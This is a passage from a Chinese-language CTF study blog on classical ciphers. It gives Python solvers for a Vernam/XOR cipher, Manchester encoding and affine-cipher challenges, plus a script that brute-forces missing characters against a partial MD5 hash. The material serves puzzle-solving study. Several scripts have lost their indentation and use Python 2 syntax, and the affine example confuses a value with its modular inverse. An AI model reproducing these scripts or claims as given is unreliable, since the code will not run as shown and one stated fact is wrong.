class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">EnCODE &#x3D;&#123;&#39;A&#39;:&#39;1000001&#39; ,&#39;N&#39;:&#39;1001110&#39;,</span><br><span class="line">        &#39;B&#39;: &#39;1000010&#39;, &#39;O&#39; :&#39;1001111&#39;,</span><br><span class="line">        &#39;C&#39;: &#39;1000011&#39;, &#39;P&#39; :&#39;1010000&#39;,</span><br><span class="line">        &#39;D&#39;: &#39;1000100&#39;, &#39;Q&#39; :&#39;1010001&#39;,</span><br><span class="line">        &#39;E&#39;: &#39;1000101&#39;, &#39;R&#39; :&#39;1010010&#39;,</span><br><span class="line">        &#39;F&#39;: &#39;1000110&#39;, &#39;S&#39; :&#39;1010011&#39;,</span><br><span class="line">        &#39;G&#39;: &#39;1000111&#39;, &#39;T&#39; :&#39;1010100&#39;,</span><br><span class="line">        &#39;H&#39;: &#39;1001000&#39;, &#39;U&#39; :&#39;1010101&#39;,</span><br><span class="line">        &#39;I&#39;: &#39;1001001&#39;, &#39;V&#39; :&#39;1010110&#39;,</span><br><span class="line">        &#39;J&#39;: &#39;1001010&#39;, &#39;W&#39; :&#39;1010111&#39;,</span><br><span class="line">        &#39;K&#39;: &#39;1001011&#39; ,&#39;X&#39; :&#39;1011000&#39;,</span><br><span class="line">        &#39;L&#39;: &#39;1001100&#39; ,&#39;Y&#39; :&#39;1011001&#39;,</span><br><span class="line">        &#39;M&#39;: &#39;1001101&#39; ,&#39;Z&#39; :&#39;1011010&#39;</span><br><span class="line">&#125;</span><br><span class="line">DeCODE&#x3D;&#123;</span><br><span class="line">        &#39;1000001&#39;:&#39;A&#39;,  &#39;1001110&#39;:&#39;N&#39;,</span><br><span class="line">        &#39;1000010&#39;:&#39;B&#39;,  &#39;1001111&#39;:&#39;O&#39;,</span><br><span class="line">        &#39;1000011&#39;:&#39;C&#39;,  &#39;1010000&#39;:&#39;P&#39;,</span><br><span class="line">        &#39;1000100&#39;:&#39;D&#39;,  &#39;1010001&#39;:&#39;Q&#39;,</span><br><span class="line">        &#39;1000101&#39;:&#39;E&#39;,  &#39;1010010&#39;:&#39;R&#39;,</span><br><span class="line">        &#39;1000110&#39;:&#39;F&#39;,  &#39;1010011&#39;:&#39;S&#39;,</span><br><span class="line">        &#39;1000111&#39;:&#39;G&#39;,  &#39;1010100&#39;:&#39;T&#39;,</span><br><span class="line">        &#39;1001000&#39;:&#39;H&#39;,  &#39;1010101&#39;:&#39;U&#39;,</span><br><span class="line">        &#39;1001001&#39;:&#39;I&#39;,  &#39;1010110&#39;:&#39;V&#39;,</span><br><span class="line">        &#39;1001010&#39;:&#39;J&#39;,  &#39;1010111&#39;:&#39;W&#39;,</span><br><span class="line">        &#39;1001011&#39;:&#39;K&#39;,  &#39;1011000&#39;:&#39;X&#39;,</span><br><span class="line">        &#39;1001100&#39;:&#39;L&#39;,  &#39;1011001&#39;:&#39;Y&#39;,</span><br><span class="line">        &#39;1001101&#39;:&#39;M&#39;,  &#39;1011010&#39;:&#39;Z&#39;</span><br><span class="line">&#125;</span><br><span class="line">steady_str&#x3D;&quot;00000100001000001101000001100001010&quot;</span><br><span class="line">steady_key&#x3D;&quot;large&quot;.upper()</span><br><span class="line">steady_new_key&#x3D;&quot;&quot;</span><br><span class="line">flag&#x3D;&quot;&quot;</span><br><span class="line">for i in steady_key:</span><br><span class="line">steady_new_key+&#x3D;EnCODE[i]</span><br><span class="line">for j in range(0,len(steady_str),7):</span><br><span class="line">inting&#x3D;&quot;&quot;</span><br><span class="line">string&#x3D;str(steady_str[j:j+7])</span><br><span class="line">string1&#x3D;str(steady_new_key[j:j+7])</span><br><span class="line">for z in range(7):</span><br><span class="line">inting+&#x3D;str(int(string[z])^int(string1[z]))</span><br><span class="line">try:</span><br><span class="line">flag+&#x3D;DeCODE[inting]</span><br><span class="line">except:</span><br><span class="line">pass</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">#费纳姆密码解密脚本</span><br><span class="line">cipher &#x3D; input(&quot;请输入密文：&quot;)</span><br><span class="line">key &#x3D; input(&quot;请输入密钥：&quot;)</span><br><span class="line">miyao &#x3D; &quot;&quot;</span><br><span class="line">flag1 &#x3D; &quot;&quot;</span><br><span class="line">final &#x3D; &quot;&quot;</span><br><span class="line">for i in key:</span><br><span class="line">    miyao +&#x3D; (str(bin(ord(i)))[2:])</span><br><span class="line">print(miyao)</span><br><span class="line">for i in range(len(cipher)):</span><br><span class="line">    flag1 +&#x3D; str(int(cipher[i])^int(miyao[i]))</span><br><span class="line">#flag七个一组进行分割</span><br><span class="line">print(cipher)</span><br><span class="line">step &#x3D; 7</span><br><span class="line">b &#x3D; [flag1[i:i+step] for i in range(0,len(flag1),step)]</span><br><span class="line">flag &#x3D; []</span><br><span class="line">for i in b:</span><br><span class="line">flag.append(i)</span><br><span class="line">for i in flag:</span><br><span class="line">    final +&#x3D; chr(int(i,2))</span><br><span class="line">print(&quot;flag为：&quot;+final)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">transform1 = &#123;<span class="string">&#x27;1000001&#x27;</span>:<span class="string">&#x27;A&#x27;</span>,<span class="string">&#x27;1000010&#x27;</span>:<span class="string">&#x27;B&#x27;</span>,</span><br><span class="line">                   <span class="string">&#x27;1000011&#x27;</span>:<span class="string">&#x27;C&#x27;</span>,<span class="string">&#x27;1000100&#x27;</span>:<span class="string">&#x27;D&#x27;</span>,</span><br><span class="line">                   <span class="string">&#x27;1000101&#x27;</span>:<span class="string">&#x27;E&#x27;</span>,<span class="string">&#x27;1000110&#x27;</span>:<span class="string">&#x27;F&#x27;</span>,</span><br><span class="line">                   <span class="string">&#x27;1000111&#x27;</span>:<span class="string">&#x27;G&#x27;</span>,<span class="string">&#x27;1001000&#x27;</span>:<span class="string">&#x27;H&#x27;</span>,</span><br><span class="line">                   <span class="string">&#x27;1001001&#x27;</span>:<span class="string">&#x27;I&#x27;</span>,<span class="string">&#x27;1001010&#x27;</span>:<span class="string">&#x27;J&#x27;</span>,</span><br><span class="line">                   <span class="string">&#x27;1001011&#x27;</span>:<span class="string">&#x27;K&#x27;</span>,<span class="string">&#x27;1001100&#x27;</span>:<span class="string">&#x27;L&#x27;</span>,</span><br><span class="line">                   <span class="string">&#x27;1001101&#x27;</span>:<span class="string">&#x27;M&#x27;</span>,<span class="string">&#x27;1001110&#x27;</span>:<span class="string">&#x27;N&#x27;</span>,</span><br><span class="line">                   <span class="string">&#x27;1001111&#x27;</span>:<span class="string">&#x27;O&#x27;</span>,<span class="string">&#x27;1010000&#x27;</span>:<span class="string">&#x27;P&#x27;</span>,</span><br><span class="line">                   <span class="string">&#x27;1010001&#x27;</span>:<span class="string">&#x27;Q&#x27;</span>,<span class="string">&#x27;1010010&#x27;</span>:<span class="string">&#x27;R&#x27;</span>,</span><br><span class="line">                   <span class="string">&#x27;1010011&#x27;</span>:<span class="string">&#x27;S&#x27;</span>,<span class="string">&#x27;1010100&#x27;</span>:<span class="string">&#x27;T&#x27;</span>,</span><br><span class="line">                   <span class="string">&#x27;1010101&#x27;</span>:<span class="string">&#x27;U&#x27;</span>,<span class="string">&#x27;1010110&#x27;</span>:<span class="string">&#x27;V&#x27;</span>,</span><br><span class="line">                   <span class="string">&#x27;1010111&#x27;</span>:<span class="string">&#x27;W&#x27;</span>,<span class="string">&#x27;1011000&#x27;</span>:<span class="string">&#x27;X&#x27;</span>,</span><br><span class="line">                   <span class="string">&#x27;1011001&#x27;</span>:<span class="string">&#x27;Y&#x27;</span>,<span class="string">&#x27;1011010&#x27;</span>:<span class="string">&#x27;Z&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#反转字典,方便将key进行编码</span></span><br><span class="line">transform2 = &#123;value:key <span class="keyword">for</span> key,value <span class="keyword">in</span> transform1.items()&#125;</span><br><span class="line"></span><br><span class="line">cipher = <span class="string">&#x27;0000011000000000101010110111001011000101100000111001100100111100111001&#x27;</span></span><br><span class="line"></span><br><span class="line">key = <span class="string">&#x27;helloworld&#x27;</span></span><br><span class="line"><span class="comment">#将字母转换成01字符串</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">trans1</span>(<span class="params">key</span>):</span></span><br><span class="line">    list2 = []</span><br><span class="line">    <span class="keyword">for</span> item <span class="keyword">in</span> key.upper():</span><br><span class="line">        list2.append(transform2[item])</span><br><span class="line">    <span class="keyword">return</span> list2</span><br><span class="line"><span class="comment">#将01字符串分割</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">trans2</span>(<span class="params">cipher</span>):</span></span><br><span class="line">    num = <span class="number">0</span></span><br><span class="line">    result = []</span><br><span class="line">    plain = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        result.append(cipher[num:num+<span class="number">7</span>])</span><br><span class="line">        num += <span class="number">7</span></span><br><span class="line">        <span class="keyword">if</span>(num &gt; len(cipher)<span class="number">-7</span>):</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"><span class="comment">#自定义异或操作</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">XOR</span>(<span class="params">text,keynew</span>):</span></span><br><span class="line">    result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(text)):</span><br><span class="line">        <span class="keyword">if</span> text[i] == keynew[i]:</span><br><span class="line">            result += <span class="string">&#x27;0&#x27;</span></span><br><span class="line">        <span class="keyword">else</span> :</span><br><span class="line">            result += <span class="string">&#x27;1&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    key1 = trans1(key)</span><br><span class="line">    cipher1 = trans2(cipher)</span><br><span class="line">    key2 = <span class="string">&#x27;&#x27;</span>.join(key1)</span><br><span class="line">    cipher2 = <span class="string">&#x27;&#x27;</span>.join(cipher1)</span><br><span class="line">    result = XOR(key2,cipher2)</span><br><span class="line">    result1 = trans2(result)</span><br><span class="line">    result2 =<span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> result1:</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">not</span> <span class="keyword">in</span> transform1:</span><br><span class="line">            result2 += <span class="string">&#x27; &#x27;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            result2 += transform1[i]</span><br><span class="line">    <span class="keyword">print</span> result2</span><br></pre></td></tr></table></figure><h2 id="MD5"><a href="#MD5" class="headerlink" title="MD5"></a>MD5</h2><p>MD5,全称Message Digest Algorithm 5，翻译过来就是消息摘要算法第5版，是计算机安全领域广泛使用的一种散列函数，用于确保信息传输的完整性。MD5算法是由MD2、MD3、MD4演变而来，是一种单向加密算法，一种不可逆的加密方式。</p><p>经过MD5加密后其MD5值长度都是固定的。MD5值长度固定为128位，而最后的值一般都用16进制数字表示，一个16进制数字占4位，所以最后的MD5值都是用32个16进制数字表示。</p><p>python-MD5加密</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">import hashlib </span><br><span class="line">md5 &#x3D; hashlib.md5()</span><br><span class="line">md5.update(&#39;how to user md5 in python hashlib?&#39;.encode(&#39;utf-8&#39;))</span><br><span class="line">print(md5.hexdigest())</span><br></pre></td></tr></table></figure><p>常见爆破脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">a=<span class="string">&#x27;TASC?O3RJMV?WDJKX?ZM&#x27;</span></span><br><span class="line">b=<span class="string">&#x27;e9032???da???08????911513?0???a2&#x27;</span></span><br><span class="line">dic1=string.digits+string.ascii_lowercase+string.ascii_uppercase</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> dic1:</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> dic1:</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> dic1:</span><br><span class="line">a=<span class="string">&#x27;TASC&#x27;</span>+i+<span class="string">&#x27;O3RJMV&#x27;</span>+j+<span class="string">&#x27;WDJKX&#x27;</span>+x+<span class="string">&#x27;ZM&#x27;</span></span><br><span class="line">steady_str=hashlib.md5(a)</span><br><span class="line">steady_str=steady_str.hexdigest()</span><br><span class="line"><span class="keyword">if</span> steady_str[:<span class="number">5</span>]==b[:<span class="number">5</span>]:</span><br><span class="line">print(a)</span><br></pre></td></tr></table></figure><h2 id="曼切斯特编码和差分曼切斯特编码"><a href="#曼切斯特编码和差分曼切斯特编码" class="headerlink" title="曼切斯特编码和差分曼切斯特编码"></a>曼切斯特编码和差分曼切斯特编码</h2><p>曼彻斯特编码（Manchester Encoding），也叫做相位编码（ Phase Encode，简写PE），是一个同步时钟编码技术，被物理层使用来编码一个同步位流的时钟和数据。</p><p>曼彻斯特编码</p><p>曼彻斯特编码表示0或1有两种不同的方法：<br>第一种G. E. Thomas, Andrew S. Tanenbaum1949年提出的，它规定0是由低-高的电平跳变表示，1是高-低的电平跳变。<br>按此规则有：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">编码0101（0x5）表示为00； </span><br><span class="line">编码1001（0x9）表示10； </span><br><span class="line">编码0110（0x6）表示01； </span><br><span class="line">编码1010（0xA）表示11。 </span><br></pre></td></tr></table></figure><p>第二种IEEE 802.4（令牌总线）和低速版的IEEE 802.3（以太网）中规定, 按照这样的说法, 低-高电平跳变表示1, 高-低的电平跳变表示0。 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">编码0101（0x5）表示11； </span><br><span class="line">编码1001（0x9）表示01； </span><br><span class="line">编码0110（0x6）表示10； </span><br><span class="line">编码1010（0xA）表示00；</span><br></pre></td></tr></table></figure><p>差分曼切斯特编码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">每位中间的跳变仅提供时钟定时，而用每位开始时有无跳变表示&quot;0&quot;或&quot;1&quot;，有跳变为&quot;0&quot;，无跳变为&quot;1&quot;。</span><br><span class="line">即:</span><br><span class="line">0-1    跳变表示 1,1-0 跳变表示 0</span><br></pre></td></tr></table></figure><p>第一种编码情况：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#拿到编码，先转换二进制，然后根据编码规则转换成二进制，然后二进制转换字符串或者十六进制。要注意转换之后二进制的长度是否要补充0</span></span><br><span class="line"><span class="comment">#最终直接转化字符串，一定要注意二进制数据是四的倍数。</span></span><br><span class="line">a=<span class="string">&quot;5555555595555A65556AA696AA6666666955&quot;</span></span><br><span class="line">b=int(a,<span class="number">16</span>)</span><br><span class="line">c=<span class="string">&#x27;0&#x27;</span>+bin(b)[<span class="number">2</span>:]</span><br><span class="line">print(<span class="string">&quot;转换成二进制为:&quot;</span>+c)</span><br><span class="line">flag=<span class="string">&quot;&quot;</span></span><br><span class="line">steady_flag=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(c),<span class="number">4</span>):</span><br><span class="line">steady=c[i:i+<span class="number">4</span>]</span><br><span class="line"><span class="keyword">if</span> steady==<span class="string">&#x27;0101&#x27;</span>:</span><br><span class="line">flag+=str(<span class="string">&#x27;00&#x27;</span>)</span><br><span class="line"><span class="keyword">elif</span> steady==<span class="string">&#x27;1001&#x27;</span>:</span><br><span class="line">flag+=str(<span class="string">&#x27;10&#x27;</span>)</span><br><span class="line"><span class="keyword">elif</span> steady==<span class="string">&#x27;0110&#x27;</span>:</span><br><span class="line">flag+=str(<span class="string">&#x27;01&#x27;</span>)</span><br><span class="line"><span class="keyword">elif</span> steady==<span class="string">&#x27;1010&#x27;</span>:</span><br><span class="line">flag+=str(<span class="string">&#x27;11&#x27;</span>)</span><br><span class="line">print(<span class="string">&quot;转化之后的二进制为:&quot;</span>+flag)</span><br><span class="line">print(hex(int(flag,<span class="number">2</span>)))</span><br><span class="line"><span class="comment">#采用第二种编码方式，并且需要将二进制数据每八位逆序。然后转换十六进制。</span></span><br></pre></td></tr></table></figure><p>第二种编码情况：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#拿到编码，先转换二进制，然后根据编码规则转换成二进制，然后二进制转换字符串或者十六进制。要注意转换之后二进制的长度是否要补充0</span></span><br><span class="line"><span class="comment">#最终直接转化字符串，一定要注意二进制数据是四的倍数。</span></span><br><span class="line">a=<span class="string">&quot;5555555595555A65556AA696AA6666666955&quot;</span></span><br><span class="line">b=int(a,<span class="number">16</span>)</span><br><span class="line">c=<span class="string">&#x27;0&#x27;</span>+bin(b)[<span class="number">2</span>:]</span><br><span class="line">print(<span class="string">&quot;转换成二进制为:&quot;</span>+c)</span><br><span class="line">flag=<span class="string">&quot;&quot;</span></span><br><span class="line">steady_flag=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(c),<span class="number">4</span>):</span><br><span class="line">steady=c[i:i+<span class="number">4</span>]</span><br><span class="line"><span class="keyword">if</span> steady==<span class="string">&#x27;0101&#x27;</span>:</span><br><span class="line">flag+=str(<span class="string">&#x27;11&#x27;</span>)</span><br><span class="line"><span class="keyword">elif</span> steady==<span class="string">&#x27;1001&#x27;</span>:</span><br><span class="line">flag+=str(<span class="string">&#x27;01&#x27;</span>)</span><br><span class="line"><span class="keyword">elif</span> steady==<span class="string">&#x27;0110&#x27;</span>:</span><br><span class="line">flag+=str(<span class="string">&#x27;10&#x27;</span>)</span><br><span class="line"><span class="keyword">elif</span> steady==<span class="string">&#x27;1010&#x27;</span>:</span><br><span class="line">flag+=str(<span class="string">&#x27;00&#x27;</span>)</span><br><span class="line">print(<span class="string">&quot;转化之后的二进制为:&quot;</span>+flag)</span><br><span class="line"><span class="comment">#采用第二种编码方式，并且需要将二进制数据每八位逆序。然后转换十六进制。</span></span><br></pre></td></tr></table></figure><h2 id="仿设加密affine"><a href="#仿设加密affine" class="headerlink" title="仿设加密affine"></a>仿设加密affine</h2><p>单码加密法的另一种形式称为仿射加密法（affine cipher）。在仿射加密法中，字母表的字母被赋予一个数字，例如a=0，b=1，c=2…z=25。仿射加密法的密钥为0-25直接的数字对。</p><p><strong>含义</strong></p><p>仿射加密法与单码加密法没什么不同，因为明文的每个字母分别只映射到一个密文字母。仿射密码的加密算法就是一个线性变换，即对任意的明文字符x，对应的密文字符为</p><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/image-20201022140951724.png" alt="image-20201022140951724">，</p><p>其中，a,b∈Z26，且要求gcd(a,26)=1,函数e(x)称为仿射加密函数。</p><p>gcd(a,b)表示非负整数a,b的最大公因数</p><p><strong>加密函数是 E(x)=(ax+b)(modm)</strong></p><p>x表示明文按照某种编码得到的数字<br>a和 m互质<br>m是编码系统中字母的数目。</p><p><strong>解密函数是 D(x)=a−1(x−b)(modm)</strong></p><p>a−1 是 a 在 Zm群的乘法逆元。</p><p><strong>乘法逆元</strong></p><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/image-20201022141012425.png" alt="image-20201022141012425"></p><p><strong>举例</strong></p><p>下面我们以 E(x)=(5x+8)mod26函数为例子进行介绍，加密字符串为 AFFINE CIPHER，</p><p>这里我们直接采用字母表26个字母作为编码系统</p><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/image-20201022141027439.png" alt="image-20201022141027439"></p><p>其对应的加密结果是 IHHWVCSWFRCP。</p><p>对于解密过程，正常解密者具有a与b，可以计算得到 a−1为 21，</p><p>所以其解密函数是D(x)=21(x−8)(mod26)</p><p>解密如下<br><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/image-20201022141043441.png" alt="image-20201022141043441"></p><p><strong>实战</strong><br>bugku affine</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">y &#x3D; 17*x-8 flag&#123;szzyfimhyzd&#125;</span><br><span class="line"> </span><br><span class="line">答案格式：flag&#123;********&#125;</span><br></pre></td></tr></table></figure><p>给了密文，加密函数。我们需要做的是解出解密函数。<code>解密函数是 D(x)=a−1(x−b)(modm)</code><br>所以我们要的明文就是，明文=<code>a-1*（x+8）mod 26</code>我们提到过a-1是a的乘法逆元(是a的负一次方)。a=17，所以他的乘法逆元就是23。解密函数为：<code>23*(x+8) mod 26</code><br>上脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string  <span class="comment">#affine</span></span><br><span class="line"> </span><br><span class="line">s = <span class="string">&#x27;szzyfimhyzd&#x27;</span></span><br><span class="line">s1 = <span class="string">&#x27;&#x27;</span></span><br><span class="line">len =len(s)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len):</span><br><span class="line">    a=(<span class="number">23</span>*(ord(s[i])<span class="number">-97</span>+<span class="number">8</span>))%<span class="number">26</span></span><br><span class="line">    s1+=chr(a+<span class="number">97</span>)</span><br><span class="line"><span class="keyword">print</span> s1</span><br></pre></td></tr></table></figure><p>脚本解释：<br>1.x表示明文按照某种编码得到的数字。即a为0，b为1，以此类推。我们在进行python解密的时候x必须要是数字，而且还是要对应<code>某种编码</code> 的数字。python中ord可以将字母转化为对应的十进制ascii，而a的ascii为97。所以这就是为什么要减去97。后面加上97是为了转换为字母。</p><p>求逆元的python脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#欧几里德算法求最大公约数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_gcd</span>(<span class="params">a, b</span>):</span></span><br><span class="line">k = a // b</span><br><span class="line">remainder = a % b</span><br><span class="line"><span class="keyword">while</span> remainder != <span class="number">0</span>:</span><br><span class="line">a = b </span><br><span class="line">b = remainder</span><br><span class="line">k = a // b</span><br><span class="line">remainder = a % b</span><br><span class="line"><span class="keyword">return</span> b</span><br><span class="line"></span><br><span class="line"><span class="comment">#改进欧几里得算法求线性方程的x与y</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_</span>(<span class="params">a, b</span>):</span></span><br><span class="line"><span class="keyword">if</span> b == <span class="number">0</span>:</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>, <span class="number">0</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">k = a // b</span><br><span class="line">remainder = a % b</span><br><span class="line">x1, y1 = get_(b, remainder)</span><br><span class="line">x, y = y1, x1 - k * y1</span><br><span class="line"><span class="keyword">return</span> x, y</span><br><span class="line"> </span><br><span class="line">a = input(<span class="string">&#x27;a:&#x27;</span>)</span><br><span class="line">b = input(<span class="string">&#x27;b:&#x27;</span>)</span><br><span class="line">a, b = int(a), int(b)</span><br><span class="line"> </span><br><span class="line"><span class="comment">#将初始b的绝对值进行保存</span></span><br><span class="line"><span class="keyword">if</span> b &lt; <span class="number">0</span>:</span><br><span class="line">m = abs(b)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">m = b</span><br><span class="line">flag = get_gcd(a, b)</span><br><span class="line"> </span><br><span class="line"><span class="comment">#判断最大公约数是否为1，若不是则没有逆元</span></span><br><span class="line"><span class="keyword">if</span> flag == <span class="number">1</span>:</span><br><span class="line">x, y = get_(a, b)</span><br><span class="line">x0 = x % m <span class="comment">#对于Python &#x27;%&#x27;就是求模运算，因此不需要&#x27;+m&#x27;</span></span><br><span class="line">print(<span class="string">&quot;所求的逆元:&quot;</span>,x0) <span class="comment">#x0就是所求的逆元</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">print(<span class="string">&quot;Do not have!&quot;</span>)</span><br></pre></td></tr></table></figure><p>BUUctf</p><p>e(x)=11x+6(mod26) 密文：welcylk</p><p>其中给出加密函数，a的逆元是11，所以a为19，b=6，所以构造脚本。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string  <span class="comment">#affine</span></span><br><span class="line"><span class="keyword">import</span> base64 </span><br><span class="line">s = <span class="string">&#x27;welcylk&#x27;</span></span><br><span class="line">s1 = <span class="string">&#x27;&#x27;</span></span><br><span class="line">len =len(s)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len):</span><br><span class="line">    a=(<span class="number">19</span>*(ord(s[i])<span class="number">-97</span><span class="number">-6</span>))%<span 